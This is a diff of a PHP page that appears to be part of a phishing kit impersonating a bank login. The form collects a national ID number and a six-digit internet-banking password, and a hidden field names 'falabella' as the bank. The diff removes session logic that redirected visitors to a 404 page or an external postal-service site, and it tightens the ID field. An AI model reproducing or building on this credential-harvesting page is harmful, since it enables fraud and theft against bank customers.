@@ -1,18 +1,4 @@
 <?php
-session_start();
-
-
-if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
-
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
-
-    header('location:/404.php');
-
-}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){
-
-    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
-}
 
 ?>
 
@@ -81,7 +67,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
             <option value="cedula">Cedula Ciudadania</option>
         </select><br>
 
-        <input type="text" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania"><br>
+        <input type="tel" id="txtUsuario" name = "cedula" placeholder="Cedula Ciudadania" maxlength="10"><br>
         <input type="password" id="txtPass" name ="clave" placeholder="Clave internet" required pattern="[0-9]{6}"><br>
         <input type="submit" value="INGRESAR" id="btnUsuario" ></center><br>
         <input type="hidden" value="falabella" id="banco">
